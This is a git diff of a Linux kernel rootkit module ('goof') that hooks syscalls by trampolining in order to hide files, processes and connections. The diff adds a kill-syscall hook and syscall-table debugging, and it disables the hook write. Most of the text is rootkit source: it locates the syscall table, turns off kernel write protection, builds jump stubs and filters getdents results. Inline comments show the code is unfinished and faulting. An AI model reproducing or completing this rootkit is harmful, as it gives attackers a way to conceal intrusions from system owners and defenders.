@@ -4,7 +4,7 @@ Author: Jack "Hulto" McKenna & Rayne Cafaro
 Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
 
 Task:
-## Hide processes ##
+## Comms with rootkti ##
 */
 
 #include <linux/err.h>
@@ -31,6 +31,8 @@ Task:
 #include <net/ip.h>
 #include <linux/socket.h>
 
+
+//## Credit: https://github.com/nurupo/rootkit/blob/master/rootkit.c ##
 //Defining possible range for syscall table to exist
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
@@ -54,8 +56,9 @@ typedef unsigned long psize;
 		write_cr0(read_cr0() | 0x10000); \
 	} while (0);
 
-
 MODULE_LICENSE("GPL");
+
+//## /Credit ##
 
 //Declare vars
 psize *sys_call_table;
@@ -69,7 +72,10 @@ int HOOK_LEN = 15;
 //mov    rax,rax
 //jmp    rax
 unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\xc0\xff\xe0";
+ 
 
+
+ 
 //Struct for each hook
 struct Hook{
 	unsigned int id;
@@ -113,6 +119,8 @@ struct linux_dirent {
 		                          // offset is (d_reclen - 1))
 								  */
 };
+
+typedef int pid_t;
 
 unsigned char *jump;
 struct Hook **hooks;
@@ -172,7 +180,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	struct linux_dirent *k_dire = kmalloc(ret, GFP_KERNEL);
 	if(!k_dire){ kfree(k_dire); return -1; }
 	struct linux_dirent *cur_dire;
-	copy_from_user(k_dire, dire, ret);
+	int a = copy_from_user(k_dire, dire, ret);
 
 	//Iterate through all of dire
 
@@ -191,7 +199,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 		}
 		i += cur_dire->d_reclen;	
 	}
-	copy_to_user(dire, ret_dire, new_len);
+	a = copy_to_user(dire, ret_dire, new_len);
 	ret = new_len;
 	
 	kfree(k_dire);
@@ -199,17 +207,13 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	return ret;	
 }
 
-//Check that the hook and trampoline are correct.
-int goofy_accept(int sockfd, struct sockaddr *addr, int *addrlen){
-//	printk("[goof] accept hook\n");
-	//Execute original funciton
-	//Calling the original function to fill out our buf variable.
-	//Any additions need to happen after the inline assembly otherwise
-	//The original function will return strange garbage
-	int (*func_ptr)(int sockfd, struct sockaddr *addr, int *addrlen) = (void *)hooks[2]->trampoline;
-	int ret = func_ptr(sockfd, addr, addrlen);		
+int goofy_kill(pid_t pid, int sig){
+	printk("[goof] goofy_kill");
+	/*FAULT - invalid opcode - Trampoline may not be copied correctly*/
+	int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
+	int ret = func_ptr(pid, sig);
 
-	printk("[goof] goofy_accept called\n");
+
 	return ret;
 }
 
@@ -287,7 +291,7 @@ unsigned char *create_tramp(psize *src, psize *new_func, unsigned int id, unsign
 	//Write hook to syscall table
 	printk("[goof] Memory hasn't been written\n");
 	DISABLE_W_PROTECTED_MEMORY
-	memcpy(src, jump, h->hook_len);
+	//memcpy(src, jump, h->hook_len);
 	ENABLE_W_PROTECTED_MEMORY
 
 	return NULL;
@@ -301,7 +305,7 @@ void remove_tramp(unsigned int id ){
 	ENABLE_W_PROTECTED_MEMORY
 }
 
-int hooks_count = 2;
+int hooks_count = 3;
 
 static int __init
 goof_init(void) {
@@ -324,6 +328,18 @@ goof_init(void) {
 	//Trampolining way to overwrite syscall
 	create_tramp((psize*)sys_call_table[__NR_uname], (psize *)goofy_uname, 0, 16);
 	create_tramp((psize*)sys_call_table[__NR_getdents], (psize *)goofy_getdents, 1, 15);
+	create_tramp((psize*)sys_call_table[__NR_kill], (psize *)goofy_kill, 2, 16);
+
+	//Creating a new trampoline - DEBUG
+	
+	printk("[goof] DEBUG\n ");
+	unsigned char *ptr_tmp = (unsigned char *)sys_call_table[__NR_kill];
+	for(int i = 0; i < 32; i++){
+		printk("%02x ", ptr_tmp[i]);
+	}
+	printk("\n");
+
+
 	return 0;
 }
 static void __exit
@@ -331,6 +347,7 @@ goof_exit(void) {
 
 	remove_tramp(0);
 	remove_tramp(1);
+	//remove_tramp(2);
 	printk("[goof] module removed\n");
 	return;
 }
